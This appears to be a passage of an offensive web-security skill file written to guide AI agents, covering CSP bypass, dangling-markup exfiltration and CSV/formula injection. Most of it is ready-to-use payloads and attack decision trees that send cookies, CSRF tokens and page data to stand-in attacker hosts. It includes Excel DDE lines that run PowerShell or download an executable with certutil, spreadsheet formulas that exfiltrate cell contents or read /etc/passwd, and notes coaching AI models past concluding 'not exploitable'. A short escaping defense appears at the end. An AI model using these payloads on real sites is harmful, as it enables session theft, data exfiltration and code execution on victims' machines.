[].constructor.constructor('alert(document.cookie)')()

// JSON.parse doesn't execute code, but if result is used in eval context:
// App does: eval('var x = ' + JSON.parse(userInput))
```

### 2.4 `script-src 'nonce-xxx'`

Only scripts with matching nonce attribute execute.

| Bypass | Condition |
|---|---|
| Nonce reuse | Server uses same nonce across requests or for all users → predictable |
| Nonce injection via CRLF | CRLF in response header → inject new CSP header with known nonce, or inject `<script nonce="known">` |
| Dangling markup to steal nonce | `<img src="https://attacker.com/steal?` (unclosed) → page content including nonce leaks as URL parameter |
| DOM clobbering | Overwrite nonce-checking code via DOM clobbering: `<form id="nonce"><input id="nonce" value="attacker-controlled">` |
| Script gadgets | Trusted nonced script uses DOM data to create new script elements — inject that DOM data |

### 2.5 `script-src 'strict-dynamic'`

Trust propagation: any script created by an already-trusted script is also trusted, regardless of source.

| Bypass | Technique |
|---|---|
| `base-uri` injection | `<base href="https://attacker.com/">` → relative script `src` resolves to attacker domain. Trusted parent script loads `./lib.js` which now points to `https://attacker.com/lib.js` |
| Script gadget in trusted code | Find trusted script that does `document.createElement('script'); s.src = location.hash.slice(1)` → control via URL fragment |
| DOM XSS in trusted script | Trusted script reads `innerHTML` from user-controlled source → injected `<script>` is trusted via `strict-dynamic` |

### 2.6 Angular / Vue CSP Bypass

**Angular (with CSP):**
```html
<!-- Angular template expression bypasses script-src when angular.js is whitelisted -->
<div ng-app ng-csp>
  {{$eval.constructor('alert(1)')()}}
</div>

<!-- Angular >= 1.6 sandbox removed, so simpler: -->
{{constructor.constructor('alert(1)')()}}
```

**Vue.js:**
```html
<!-- Vue 2 with runtime compiler -->
<div id=app>{{_c.constructor('alert(1)')()}}</div>
<script src="https://whitelisted-cdn/vue.js"></script>
<script>new Vue({el:'#app'})</script>
```

### 2.7 Missing `object-src`

If `object-src` is not set (falls back to `default-src`), and `default-src` allows some origins:

```html
<!-- Flash-based bypass (legacy, mostly patched, but still appears on old systems) -->
<object data="https://attacker.com/evil.swf" type="application/x-shockwave-flash">
  <param name="AllowScriptAccess" value="always">
</object>

<!-- PDF plugin abuse -->
<embed src="/user-upload/evil.pdf" type="application/pdf">
```

### 2.8 Missing `base-uri`

```html
<!-- Inject base tag → all relative URLs resolve to attacker -->
<base href="https://attacker.com/">

<!-- Existing script: <script src="/js/app.js"> -->
<!-- Now loads: https://attacker.com/js/app.js -->
```

This bypasses `'nonce-xxx'`, `'strict-dynamic'`, and `script-src 'self'` for relative script paths.

### 2.9 Missing `frame-ancestors`

CSP without `frame-ancestors` → page can be framed → clickjacking possible.

`X-Frame-Options` header is overridden by `frame-ancestors` if CSP is present. But if CSP exists without `frame-ancestors`, some browsers ignore XFO entirely.

---

## 3. CSP IN META TAG vs. HEADER

```html
<meta http-equiv="Content-Security-Policy" content="script-src 'self'">
```

**Meta tag limitations:**
- Cannot set `frame-ancestors` (ignored in meta)
- Cannot set `report-uri` / `report-to`
- Cannot set `sandbox`
- If injected via HTML injection *before* the meta tag in DOM order, attacker's meta CSP may be processed first (browser uses first encountered)
- If page has both header CSP and meta CSP, **both apply** (most restrictive wins)

---

## 4. DATA EXFILTRATION DESPITE CSP

When `connect-src`, `img-src`, etc. are locked down, alternative exfiltration channels:

| Channel | CSP Directive Needed to Block | Technique |
|---|---|---|
| DNS prefetch | None (CSP cannot block DNS) | `<link rel="dns-prefetch" href="//data.attacker.com">` |
| WebRTC | None (CSP cannot block) | `new RTCPeerConnection({iceServers:[{urls:'stun:attacker.com'}]})` |
| `<link rel=prefetch>` | `default-src` or `connect-src` | Often missed in CSP |
| Redirect-based | `navigate-to` (rarely set) | `location='https://attacker.com/?'+document.cookie` |
| CSS injection | `style-src` | `<style>body{background:url(https://attacker.com/?data)}</style>` |
| `<a ping>` | `connect-src` | `<a ping="https://attacker.com/collect" href="#">click</a>` |
| `report-uri` leak | N/A | Trigger CSP violation → report contains blocked-uri with data |
| Form submission | `form-action` | `<form action="https://attacker.com/"><button>Submit</button></form>` |

**DNS-based exfiltration is nearly impossible to block with CSP** — this is the most reliable channel.

---

## 5. CSP BYPASS DECISION TREE

```
CSP present?
├── Read full policy (response headers + meta tags)
│
├── Check for obvious weaknesses
│   ├── 'unsafe-inline' in script-src? → Standard XSS works
│   ├── 'unsafe-eval' in script-src? → eval/Function/setTimeout bypass
│   ├── * or data: in script-src? → <script src="data:,alert(1)">
│   └── No CSP header at all on some pages? → Find CSP-free page
│
├── Check missing directives
│   ├── No base-uri? → <base href="https://attacker.com/"> → hijack relative scripts
│   ├── No object-src? → Flash/plugin-based bypass (legacy)
│   ├── No form-action? → Exfil via form submission
│   ├── No frame-ancestors? → Clickjacking possible
│   └── No connect-src falling back to lax default-src? → fetch/XHR exfil
│
├── script-src 'self'?
│   ├── Find JSONP endpoints on same origin
│   ├── Find file upload → upload .js file
│   ├── Find DOM XSS in existing same-origin scripts
│   └── Find Angular/Vue loaded from self → template injection
│
├── script-src with CDN whitelist?
│   ├── Check CDN for JSONP endpoints
│   ├── Check jsdelivr/unpkg/cdnjs → load attacker-controlled package
│   └── Check *.cloudfront.net → shared distribution namespace
│
├── script-src 'nonce-xxx'?
│   ├── Nonce reused across requests? → Replay
│   ├── CRLF injection available? → Inject nonce
│   ├── Dangling markup to steal nonce
│   └── Script gadget in trusted scripts
│
├── script-src 'strict-dynamic'?
│   ├── base-uri not set? → <base> hijack
│   ├── DOM XSS in trusted script? → Inherit trust
│   └── Script gadget creating dynamic scripts from DOM data
│
└── All script execution blocked?
    ├── Dangling markup injection → exfil without JS (see ../dangling-markup-injection/SKILL.md)
    ├── DNS prefetch exfiltration
    ├── WebRTC exfiltration
    ├── CSS injection for data extraction
    └── Form action exfiltration
```

---

## 6. TRICK NOTES — WHAT AI MODELS MISS

1. **`default-src 'self'` does NOT restrict `base-uri` or `form-action`** — these have no fallback. This is the #1 CSP mistake.
2. **`strict-dynamic` ignores whitelist**: When `strict-dynamic` is present, host-based allowlists and `'self'` are ignored for script loading. Only nonce/hash and trust propagation matter.
3. **Multiple CSPs stack**: If both `Content-Security-Policy` header and `<meta>` CSP exist, the browser enforces BOTH — the effective policy is the intersection (most restrictive).
4. **`Content-Security-Policy-Report-Only`** does not enforce — it only reports. Check for the correct header name.
5. **Nonce length matters**: Nonces should be ≥128 bits of entropy. Short or predictable nonces can be brute-forced or guessed.
6. **Report-uri information disclosure**: CSP violation reports sent to `report-uri` contain `blocked-uri`, `source-file`, `line-number` — this can leak internal URLs, script paths, and page structure to whoever controls the report endpoint.
7. **`data:` in script-src**: `script-src 'self' data:` allows `<script src="data:text/javascript,alert(1)">` — trivial bypass, but commonly seen in real-world CSPs.


---

# Part 5: Dangling Markup Injection


# SKILL: Dangling Markup Injection — Exfiltration Without JavaScript

> **AI LOAD INSTRUCTION**: Covers dangling markup exfiltration via unclosed img/form/base/meta/link/table tags, what can be stolen (CSRF tokens, pre-filled form values, sensitive content), browser-specific behavior, and combinations with other attacks. Base models often overlook this technique entirely when CSP blocks scripts, jumping to "not exploitable" — dangling markup is the answer.

## 0. RELATED ROUTING

- [xss-cross-site-scripting](../xss-cross-site-scripting/SKILL.md) when full XSS is possible (no need for dangling markup)
- [csp-bypass-advanced](../csp-bypass-advanced/SKILL.md) when CSP blocks JS execution — dangling markup bypasses script restrictions
- [csrf-cross-site-request-forgery](../csrf-cross-site-request-forgery/SKILL.md) when dangling markup steals CSRF tokens for subsequent CSRF attacks
- [crlf-injection](../crlf-injection/SKILL.md) when CRLF enables HTML injection in HTTP response
- [web-cache-deception](../web-cache-deception/SKILL.md) when dangling markup + cache poisoning amplifies the attack


## 1. WHEN TO USE DANGLING MARKUP

You need dangling markup when ALL of these are true:

1. You have an HTML injection point (reflected or stored)
2. JavaScript execution is blocked:
   - CSP blocks inline scripts and event handlers
   - Sanitizer strips `<script>`, `onerror`, `onload`, etc.
   - WAF blocks known XSS patterns
3. The page contains sensitive data AFTER your injection point:
   - CSRF tokens
   - Pre-filled form values (email, username, API keys)
   - Session identifiers in hidden fields
   - Sensitive user content

**Core insight**: You don't need JavaScript to exfiltrate data — you just need the browser to make a request that includes the data in the URL.

---

## 2. CORE TECHNIQUE

Inject an unclosed HTML tag with a `src`, `href`, `action`, or similar attribute pointing to your server. The unclosed attribute quote "consumes" all subsequent page content until the browser finds a matching quote.

```html
Page before injection:
  <div>Hello USER_INPUT</div>
  <form>
    <input type="hidden" name="csrf" value="SECRET_TOKEN_123">
    <input type="text" name="email" value="user@target.com">
  </form>

Injected payload:
  <img src="https://attacker.com/collect?

Resulting HTML:
  <div>Hello <img src="https://attacker.com/collect?</div>
  <form>
    <input type="hidden" name="csrf" value="SECRET_TOKEN_123">
    <input type="text" name="email" value="user@target.com">
  </form>
  ...rest of page until next matching quote (")...
```

The browser interprets everything from `https://attacker.com/collect?` until the next `"` as the URL. The hidden CSRF token and email value become part of the URL query string sent to `attacker.com`.

---

## 3. EXFILTRATION VECTORS

### 3.1 Image Tag (Most Common)

```html
<!-- Double-quote context -->
<img src="https://attacker.com/collect?

<!-- Single-quote context -->
<img src='https://attacker.com/collect?

<!-- Backtick context (IE only, legacy) -->
<img src=`https://attacker.com/collect?
```

The browser sends a GET request to `attacker.com` with all consumed content as query parameters.

**Blocked by**: `img-src` CSP directive

### 3.2 Form Action Hijack

```html
<form action="https://attacker.com/collect">
<button>Click to continue</button>
<!--
```

If the page has form elements after the injection point, the next `</form>` closes the attacker's form. All input fields between become part of the attacker's form → submitted to attacker on user interaction.

**Blocked by**: `form-action` CSP directive

**Trick**: Even without user interaction, if there's an existing submit button or JavaScript auto-submit, the form submits automatically.

### 3.3 Base Tag Hijack

```html
<base href="https://attacker.com/">
```

All subsequent relative URLs on the page resolve to attacker's server:
- `<script src="/js/app.js">` → loads `https://attacker.com/js/app.js`
- `<a href="/profile">` → links to `https://attacker.com/profile`
- `<form action="/submit">` → submits to `https://attacker.com/submit`

**Blocked by**: `base-uri` CSP directive

### 3.4 Meta Refresh Redirect

```html
<meta http-equiv="refresh" content="0;url=https://attacker.com/collect?
```

Redirects the entire page to attacker's server with consumed page content in the URL.

**Blocked by**: `navigate-to` CSP directive (rarely set), some browsers ignore meta refresh when CSP is present.

### 3.5 Link/Stylesheet Exfiltration

```html
<link rel="stylesheet" href="https://attacker.com/collect?
```

Browser requests the URL as a CSS resource, leaking consumed content.

**Blocked by**: `style-src` CSP directive

### 3.6 Table Background (Legacy)

```html
<table background="https://attacker.com/collect?
```

Works in older browsers that support the `background` attribute on table elements.

**Blocked by**: `img-src` CSP directive

### 3.7 Video/Audio Poster

```html
<video poster="https://attacker.com/collect?
<audio src="https://attacker.com/collect?
```

**Blocked by**: `media-src` / `img-src` CSP directives

---

## 4. WHAT CAN BE STOLEN

| Target Data | How It Appears in Page | Steal Technique |
|---|---|---|
| CSRF token | `<input type="hidden" name="csrf" value="...">` | Dangling `<img src=` before the form |
| Pre-filled email | `<input value="user@example.com">` | Dangling tag before the input |
| API keys in page | `var apiKey = "sk-..."` in inline script | Dangling tag before the script block |
| Session ID in hidden field | `<input name="session" value="...">` | Dangling tag before the form |
| Auto-filled passwords | Browser auto-fills password field | `<form action=attacker>` with matching input names |
| OAuth state/tokens | In URL parameters or hidden form fields | Dangling tag on authorization page |
| Internal URLs/paths | Links, script sources, API endpoints | `<base>` tag hijack captures all relative URLs |

---

## 5. BROWSER-SPECIFIC BEHAVIOR

| Browser | Behavior |
|---|---|
| **Chrome/Chromium** | Blocks dangling markup in `<img>` `src` containing `<` or newlines (since Chrome 60). Still allows `<form action>`, `<base>`, `<link>`. |
| **Firefox** | More permissive with dangling markup in image sources. Allows newlines in attribute values. |
| **Safari** | Similar to Chrome's restrictions. May handle some edge cases differently. |
| **Edge (Chromium)** | Same as Chrome behavior. |

### Chrome Mitigation Detail

Chrome blocks navigation/resource load when the URL attribute value contains:
- `<` character (indicates HTML tag consumption)
- Newline characters (`\n`, `\r`)

**Bypass**: Use `<form action>` instead of `<img src>` — Chrome's block only targets specific tags.

---

## 6. ADVANCED TECHNIQUES

### 6.1 Selective Consumption

Choose quote type strategically: if page uses `"` for attributes, inject with `'` (and vice versa) to precisely control where consumption stops.

### 6.2 Textarea + Form Combo

`<form action="https://attacker.com/collect"><textarea name="data">` — unclosed textarea eats all subsequent HTML as plaintext; form submission sends it to attacker.

### 6.3 Comment / Style Dangling

- `<!-- ` without closing `-->` consumes all content (no exfil, but hides page content)
- `<style>` unclosed treats page as CSS; combine with `@import url("https://attacker.com/?` for exfil

### 6.4 Window.name via iframe

`<iframe src="https://target.com/page" name="` — name attribute consumes content, and `window.name` persists across origins after navigation.

---

## 7. LIMITATIONS

| Limitation | Detail |
|---|---|
| Same-origin content only | Dangling markup only captures content from the same HTTP response |
| Quote matching | Consumption stops at the next matching quote character — may not reach target data |
| CSP img-src/form-action | Strict CSP can block most exfiltration vectors |
| Chrome's dangling markup mitigation | Blocks `<img src=` with `<` or newlines in URL |
| Injection point must be before target data | Can only capture content that appears after the injection in HTML source order |
| Content encoding | URL-unsafe characters in captured content may be mangled |

---

## 8. COMBINATION ATTACKS

### 8.1 Dangling Markup + Open Redirect

```
1. Inject <img src="https://target.com/redirect?url=https://attacker.com/collect?
2. Open redirect on target.com makes the request "same-origin" for some CSP checks
3. Redirect sends captured data to attacker
```

### 8.2 Dangling Markup + Cache Poisoning

```
1. Find reflected HTML injection point
2. Inject dangling markup payload
3. If response is cached, ALL users see the dangling markup
4. Tokens/data from all victims exfiltrated
```

This turns a reflected injection into a stored/persistent attack.

### 8.3 Dangling Markup + CSRF

```
1. Use dangling markup to steal CSRF token from page
2. Use stolen token to perform CSRF attack
3. Allows CSRF even when tokens are properly implemented
```

### 8.4 Dangling Markup + Clickjacking

```
1. Inject <form action="https://attacker.com/collect"><textarea name="data">
2. Frame the page (if frame-ancestors allows)
3. Trick user into clicking "Submit" via clickjacking overlay
4. Form submits all captured page content to attacker
```

---

## 9. DANGLING MARKUP DECISION TREE

```
HTML injection exists but XSS is blocked (CSP/sanitizer/WAF)?
│
├── Identify injection context
│   ├── Inside attribute value? → Break out first: "><img src="https://attacker.com/collect?
│   ├── Inside tag content? → Inject directly: <img src="https://attacker.com/collect?
│   └── Inside script block? → Close script first: </script><img src="...
│
├── What sensitive data exists AFTER injection point?
│   ├── CSRF tokens → HIGH VALUE: steal token → CSRF attack
│   ├── User PII (email, name) → data theft
│   ├── API keys / secrets → account compromise
│   ├── No sensitive data after injection → dangling markup not useful here
│   └── Check different pages — injection may be on a page with sensitive data
│
├── Choose exfiltration vector based on CSP
│   ├── No CSP / lax CSP → <img src="...  (simplest)
│   ├── img-src restricted?
│   │   ├── form-action unrestricted? → <form action="attacker"><textarea name=d>
│   │   ├── base-uri unrestricted? → <base href="attacker">
│   │   └── style-src unrestricted? → <link rel=stylesheet href="...
│   ├── Strict CSP on all directives?
│   │   ├── meta refresh? → <meta http-equiv="refresh" content="0;url=attacker?
│   │   ├── DNS prefetch? → <link rel=dns-prefetch href="//data.attacker.com">
│   │   └── Window.name via iframe? → <iframe name="...
│   └── Nothing works? → dangling markup blocked, try other approaches
│
├── Handle Chrome's dangling markup mitigation
│   ├── Target uses Chrome? → Avoid <img src= with < or newlines
│   ├── Use <form action=> instead (not blocked)
│   ├── Use <base href=> (not blocked)
│   └── Test in Firefox as fallback (more permissive)
│
├── Choose quote type for maximum capture
│   ├── Target data uses double quotes? → Inject with single quote: <img src='...
│   ├── Target data uses single quotes? → Inject with double quote: <img src="...
│   └── Mixed quotes? → Test both, see which captures more useful data
│
└── Amplification
    ├── Response cached? → Poison cache → steal from multiple victims
    ├── Stored injection? → Every page view exfiltrates
    └── Reflected only? → Deliver via phishing link
```

---

## 10. TRICK NOTES — WHAT AI MODELS MISS

1. **Dangling markup is THE answer when CSP blocks scripts but HTML injection exists.** Models trained on XSS often conclude "not exploitable" when CSP is strict — dangling markup doesn't need JavaScript.
2. **Chrome's mitigation is tag-specific, not universal**: `<img src=` is mitigated, but `<form action=`, `<base href=`, `<meta http-equiv=refresh>` are NOT. Always try alternative vectors.
3. **Quote type selection is critical**: If the page uses `"` for attributes, inject with `'` (or vice versa) to control exactly where consumption stops. Wrong quote type = capturing useless content or nothing.
4. **Injection point placement matters enormously**: The injection must appear BEFORE the target data in the HTML source. If CSRF token is above your injection point, dangling markup cannot capture it.
5. **`<textarea>` is the most underrated vector**: An unclosed textarea eats ALL subsequent HTML as plaintext. Combined with form action hijack, it's the most reliable method when img-src is restricted.
6. **Window.name persists across origins**: If you can inject an iframe, the `name` attribute technique is powerful because `window.name` survives cross-origin navigation — a rare cross-origin data channel.
7. **DNS prefetch exfiltration works even under strict CSP**: `<link rel=dns-prefetch href="//stolen-data.attacker.com">` triggers a DNS lookup that CSP cannot block. Limited to ~253 characters per label, but sufficient for tokens.

---

# Part 6: CSV / Formula Injection (CSI)

CSV injection (also called formula injection) occurs when attacker-controlled content that begins with `=`, `+`, `-`, or `@` is later opened in a spreadsheet application (Excel, LibreOffice, Google Sheets). The spreadsheet interprets the cell as a formula, not text. This is in the XSS file because the threat model is identical — user-controlled string lands in a renderer (browser vs spreadsheet) that interprets it as code — and the remediation pattern (context-aware escaping) is the same.

## 1. Non-Obvious Techniques

### 1.1 The four dangerous prefix characters

Most defenders only escape `=`. Excel and LibreOffice also treat `+`, `-`, and `@` as formula prefixes:
- `=CMD()` — classic
- `+cmd|'/c calc'!A1` — DDE
- `-2+5+cmd|'/c calc'!A1` — negative-number formula chains to DDE
- `@SUM(A1:A2)` — implicit-intersection operator (older Excel)

Always escape all four at the start of any user-supplied cell value.

### 1.2 DDE (Dynamic Data Exchange) — RCE on Excel open

```text
=cmd|'/c calc'!A1
```
When the user opens the CSV and clicks "Enable content", Excel spawns `cmd.exe /c calc`. Modern Excel shows a warning but most users click through.

Variants:
```text
=MSEXCEL|'\..\..\..\Windows\System32\cmd.exe /c calc'!''A1
=cmd|'/c powershell -nop -w hidden -enc <base64>'!A1
=cmd|'/c certutil -urlcache -split -f http://ATTACKER/payload.exe %TEMP%\p.exe'!A1
```

### 1.3 Google Sheets / Excel Online — `IMPORTXML` data exfiltration

Cloud spreadsheets have no DDE but execute formulas server-side. `IMPORTXML` fetches arbitrary URLs:
```text
=IMPORTXML("https://ATTACKER/?data="&A1&A2, "//a")
```
This sends the contents of A1 and A2 to the attacker when the sheet owner opens the document. `IMPORTDATA`, `IMAGE`, `HYPERLINK` all work similarly.

`HYPERLINK` is especially sneaky — the cell renders as a clickable link, and clicking sends the URL with no warning. Prepend `=HYPERLINK("https://ATTACKER/?token="&B2, "Click for details")` to make the user's click do the exfiltration.

### 1.4 LibreOffice — local file read via `WEBSERVICE`

```text
=WEBSERVICE("file:///etc/passwd")
```
Returns the file content into the cell. Also: `=WEBSERVICE("http://ATTACKER/?d="&A1)` for OOB exfil.

### 1.5 Persistence via named ranges / macro embedding

In `.xlsx` exports that preserve formulas, attackers can define a named range whose value is a formula and reference it from a clean-looking cell. The formula fires when the cell recalculates, evading naive cell-content review.

### 1.6 Spreadsheet wrapping in `.xls` (HTML-table-Excel)

Excel happily opens HTML files with `.xls` extension. An attacker-vulnerable export that produces CSV also often produces "Excel format" that is actually HTML — and HTML allows full XSS in the Excel-embedded IE renderer:
```html
<html><body>
<table><tr><td>=cmd|'/c calc'!A1</td></tr></table>
<script>alert('xss in excel')</script>
</body></html>
```

## 2. Quick payload reference

| Goal | Payload |
|---|---|
| Calc (Excel) | `=cmd\|'/c calc'!A1` |
| Calc (Excel alt) | `=MSEXCEL\|'\..\..\..\Windows\System32\cmd.exe /c calc'!''A1` |
| Exfil (Sheets) | `=IMPORTXML(CONCAT("http://ATTACKER/?d=",A1),"//a")` |
| Exfil (Excel) | `=HYPERLINK("http://ATTACKER/?d="&A1,"View")` |
| File read (LibreOffice) | `=WEBSERVICE("file:///etc/passwd")` |
| Multi-cell exfil | `=SUM(1+9275)*IMPORTDATA("http://ATTACKER/?d="&A1&A2)` |
| HTTP OOB | `=FILTERXML(WEBSERVICE("http://ATTACKER/?d="&A1),"//a")` |

## 3. Where to look

1. **Export endpoints** — `/export.csv`, `/reports/excel`, `/admin/users.xlsx` — anywhere a user-controlled field (name, address, note, comment) lands in a downloadable spreadsheet.
2. **Admin reports** — incident, audit, billing exports where end-user-supplied strings appear.
3. **CSV preview features** — some web apps render CSV inline with a JS library that evaluates formulas. Test the preview too.
4. **Shopify / Salesforce / Google Forms** — any platform where customers enter data that admins later export.

## 4. Defense

Escape dangerous prefix characters by prepending a single quote (`'`) or tab — but ONLY for cells whose value begins with `=`, `+`, `-`, or `@`:
```python
def csv_safe(s):
    if s and s[0] in ('=', '+', '-', '@'):
        return "'" + s
    return s
```
Tab-prefix (`"\t" + s`) is the alternative — Excel hides the tab and renders the value as text.

Do NOT blanket-prefix every cell; that breaks legitimate numeric data and dates.

For `.xlsx` exports prefer a library that writes typed cells (e.g., openpyxl with `cell.data_type = 's'`) rather than `.csv` text.

## 5. Common AI blind spots

1. **`+`, `-`, `@` are formula prefixes too.** Most CVEs and writeups focus on `=`, but escaping only `=` is incomplete. Run `-1+1+cmd|...` to demonstrate.
2. **Cloud spreadsheets don't need DDE.** Google Sheets and Excel Online execute `IMPORTXML`/`IMPORTDATA` server-side without prompts — the moment the analyst opens the file, the URL fires. This is a *more reliable* exploit than Excel DDE in 2024+.
3. **CSV formulas fire on `open`, not on `parse`.** The server that generates the CSV is fine; the analyst's spreadsheet is the target. Demo with a webhook.
4. **`HYPERLINK` makes the user click.** No warning dialog, no "enable content" — the click itself is the consent. Use it when DDE is patched.
5. **Blanket-prefixing all cells is wrong.** It breaks numbers and dates. Only prefix when the first character is one of the four triggers.
6. **`.xls` HTML hybrid is a hidden XSS vector.** If you see `Content-Type: application/vnd.ms-excel` but the body is HTML, the export may render in an embedded IE control.
